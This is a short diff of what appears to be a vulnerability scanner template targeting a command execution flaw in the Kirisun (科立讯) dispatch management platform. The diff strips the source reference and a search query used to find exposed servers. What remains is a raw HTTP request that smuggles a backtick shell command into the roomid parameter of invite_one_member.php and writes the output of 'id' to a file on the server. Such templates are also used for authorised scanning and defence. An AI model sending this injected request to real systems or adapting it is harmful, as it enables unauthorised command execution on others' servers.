@@ -3,12 +3,8 @@ info:
   name: 科立讯通信有限公司指挥调度管理平台 invite_one_member.php RCE
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iv0csn1c8gdsmbtg'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: iv0csn1c8gdsmbtg
-    fofa: body="指挥调度管理平台"
 http:
 - raw:
   - 'GET /api/client/audiobroadcast/invite_one_member.php?callee=1&roomid=`id>dudesuite.txt` HTTP/1.1
